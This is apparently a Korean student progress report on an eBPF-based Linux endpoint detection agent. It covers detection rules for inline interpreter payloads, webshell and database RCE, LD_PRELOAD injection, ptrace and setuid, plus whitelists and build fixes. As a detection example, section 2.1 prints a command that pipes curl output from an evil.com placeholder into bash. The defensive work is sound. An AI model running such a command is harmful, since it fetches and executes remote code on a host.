---
project_name: "GhostRelay"
quad_name: "4조"
members: ["박도현"]
report_number: 2
date: "2026-05-19"
status: "진행 중"
cl_level: "CL3"
field: "시스템 보안"
contributions:
  - name: "박도현"
    role: "에이전트 개발 (시스템)"
    tasks: "execve argv 캡처 및 R-010 구현, 프로세스 트리 캐시 및 R-011/R-012 구현, 화이트리스트 체계 구축, 프로세스 종료 훅 및 알림 중복 억제, R-013~R-015 고급 탐지 룰 추가, Ubuntu 22.04 빌드 호환성 수정"
    percentage: 100
---

## 1. 팀 전체 진행 현황

### 이번 회차 목표

1주차에 완성한 eBPF 기반 3종 모니터링(프로세스·파일·네트워크)과 기본 탐지 룰(R-001~R-009) 위에 탐지 품질 고도화 및 에이전트 안정화를 목표로 진행하였다.

- execve argv 캡처를 통한 인라인 페이로드 탐지
- 프로세스 트리 기반 부모-자식 관계 탐지 (웹셸, SQLi RCE)
- 화이트리스트 체계 구축으로 FP 대폭 감소
- 에이전트 안정성 개선 (프로세스 종료 훅, 알림 dedup, graceful shutdown)
- LD_PRELOAD·setuid·ptrace 고급 탐지 룰 추가

### 현재 진행률

| 구분 | 목표 | 완료 |
|------|------|------|
| 탐지 룰 | R-001~R-028 | R-001~R-015 |
| BPF 프로그램 | 6개 | 4개 |
| 운영 안정화 | dedup·shutdown·통계 | 완료 |
| 빌드 호환성 | Ubuntu 22.04 지원 | 완료 |

전체 진행률 약 **55%**

### 주요 달성 사항

- R-010~R-012 탐지 룰 구현 완료 (인터프리터 인라인 페이로드, 웹셸/SQLi RCE)
- ProcTree 클래스 구현 및 `/proc` 스캔 부트스트랩
- 4종 화이트리스트 도입 후 FP 비율 현저히 감소
- R-013(LD_PRELOAD 인젝션), R-014(ptrace), R-015(setuid) 탐지 추가
- Ubuntu 22.04 + clang-14 빌드 문제 수정 (vmlinux.h 사전 생성 포함)

---

## 2. 개인별 기여 내역

| 이름 | 역할 | 수행 작업 | 산출물 | 기여율 |
|------|------|-----------|--------|--------|
| 박도현 | 에이전트 개발 | 아래 상세 참조 | [GitHub 커밋](https://github.com/no-carve-only-pizza/edr-agent) | 100% |

### 2.1 execve argv 캡처 및 R-010 (인터프리터 인라인 페이로드)

`sched_process_exec` 훅만으로는 실행 인자(argv)를 얻을 수 없어 파일리스 공격 탐지에 한계가 있었다.

**두 훅 조합 방식:**
- `sys_enter_execve`: argv가 유저 스택에 존재하는 시점에 읽어 `argv_store (BPF_MAP_TYPE_HASH)`에 PID 키로 저장
- `sched_process_exec`: execve 성공 확인 후 맵에서 꺼내 `process_event.argv`에 복사, 링버퍼 제출 후 맵 삭제

R-010은 인터프리터(`python3`, `perl`, `node` 등)가 `-c`/`-e` 플래그로 실행될 때 발화한다.

```
[EXEC] python3 -c "import os; os.system('curl http://evil.com|bash')"
  >>> [ALERT] R-010 | 인터프리터 인라인 페이로드 (-c/-e 플래그) [high]
```

### 2.2 프로세스 트리 캐시 및 R-011/R-012 (웹셸·SQLi RCE)

exec 이벤트의 `ppid`만으로는 부모 `comm`을 알 수 없어 웹셸/DB RCE 탐지가 불가능했다.

**ProcTree 클래스** (`src/proc_tree.cpp`):
- `update(pid, ppid, comm)`: 실행 이벤트마다 맵에 등록
- `comm_of(ppid)`: 부모 comm 조회
- `init_from_proc()`: 에이전트 시작 전부터 실행 중인 nginx, mysqld 등을 `/proc/<pid>/status` 스캔으로 부트스트랩

| 룰 | 탐지 조건 | 심각도 |
|----|-----------|--------|
| R-011 | 웹 서버(nginx, apache 등) → 셸/인터프리터 실행 | critical |
| R-012 | DB 서버(mysqld, postgres 등) → 셸/인터프리터 실행 | critical |

### 2.3 화이트리스트 체계 구축

1주차 구현에서 FP 비율이 높은 룰을 분석하고 4종 화이트리스트를 도입하였다.

| 화이트리스트 | 적용 룰 | 예시 |
|-------------|---------|------|
| `BIND_WHITELIST` | R-007 | sshd, nginx, dockerd |
| `SYS_WRITE_WHITELIST` | R-001 | apt, dpkg, rpm |
| `OUTBOUND_WHITELIST` | R-006 | curl, wget, git |
| `PKG_MANAGER_COMMS` | R-005/R-008 부모 억제 | pip, npm, make |

### 2.4 에이전트 안정화

**프로세스 종료 훅** (`sched_process_exit`): ProcTree에서 종료된 PID를 즉시 제거하여 PID 재사용으로 인한 오탐 방지. TGID==TID 조건으로 스레드 종료는 필터링.

**알림 중복 억제 (dedup)**: 동일 `(pid, rule_id)` 조합의 알림을 3초 윈도우 내 1회만 출력. 반복 실행 탐지 노이즈 현저히 감소.

**graceful shutdown**: `SIGINT`/`SIGTERM` 수신 시 링버퍼를 모두 드레인한 후 종료. 종료 시 룰별 발화 횟수 요약 출력.

### 2.5 R-013~R-015 고급 탐지 룰

| 룰 | 탐지 조건 | 구현 포인트 |
|----|-----------|-------------|
| R-013 | LD_PRELOAD 환경변수 인젝션 | `sys_enter_execve`에서 `envp` 순회, `has_ld_preload` 플래그 |
| R-014 | ptrace ATTACH 시도 | `ptrace_event` 전용 BPF 훅 + 링버퍼 |
| R-015 | 알려지지 않은 setuid 바이너리 실행 | `uid ≠ euid` 조건, `SETUID_WHITELIST`로 sudo/ping 등 제외 |

R-013은 `sys_enter_execve` 훅에서 `envp[]`를 순회하여 `LD_PRELOAD` 접두사를 감지한다. BPF 검증기 통과를 위해 `MAX_ENV_ENTRIES=16` 회 완전 전개(`#pragma unroll`) 적용.

### 2.6 Ubuntu 22.04 빌드 호환성 수정

팀원 빌드 환경(Ubuntu 22.04, clang-14)에서 발생한 빌드 오류를 수정하였다.

| 원인 | 수정 내용 |
|------|-----------|
| `find_program` HINTS/PATHS 순서 오류로 구버전 bpftool 선택 | HINTS에 커널 버전 전용 경로 우선 지정 |
| clang-14 생성 DWARF 섹션을 libbpf v1.4가 파싱 실패 | 빌드 후 `llvm-strip --strip-debug`로 DWARF 제거 |
| `clang` 바이너리 없음 (Ubuntu 22.04는 `clang-14`로 설치) | `NAMES clang clang-14 ... clang-18` 순서로 탐색 |
| 호스트 `vmlinux.h` 생성 불가 (bpftool 버전 불일치) | `include/vmlinux.h` 사전 생성 후 커밋, 빌드 시 복사 |

---

## 3. 이슈 및 해결 방안

### 이슈 1: BPF 검증기 복잡도 초과 (E2BIG)

`dns_monitor.bpf.c`의 QNAME 파싱 로직에서 중첩 `#pragma unroll`(10 × 63 = 630회 전개)이 BPF 검증기 명령어 복잡도 한계를 초과하여 `Argument list too long` 오류가 발생하였다.

**해결:** 중첩 루프를 `label_left`/`need_dot` 상태 변수를 가진 단일 bounded 루프(115회)로 재설계. 커널 5.3+에서 bounded loop를 verifier가 직접 지원함을 확인하여 적용.

### 이슈 2: Ubuntu 22.04 빌드 실패 (팀원 환경)

`Relocations in generic ELF (EM: 247)` 오류 원인 분석에 Docker 기반 재현을 시도했으나, glibc 버전 불일치와 커널 BTF 버전 불일치로 완전한 환경 재현이 불가능하였다. `vmlinux.h` 사전 포함으로 우회.

---

## 4. 다음 회차 목표

| 항목 | 내용 |
|------|------|
| R-016~R-018 구현 | memfd_create 파일리스 실행, RWX 메모리, DNS 터널링 탐지 |
| 상관 분석 엔진 | R-019~R-023: ptrace+memfd, /tmp 실행+아웃바운드 등 이벤트 체인 탐지 |
| 위협 인텔리전스 | Feodo Tracker IP 블록리스트, URLhaus 도메인 피드 연동 (R-025~R-026) |
| 대시보드 연동 | 백엔드 API 포맷 협의 및 NDJSON 스키마 확정 |

---

## 5. 참고 자료

- libbpf-bootstrap: https://github.com/libbpf/libbpf-bootstrap
- Linux BPF verifier documentation: https://docs.kernel.org/bpf/verifier.html
- MITRE ATT&CK Linux techniques: https://attack.mitre.org/matrices/enterprise/linux/
- 소스코드: https://github.com/no-carve-only-pizza/edr-agent
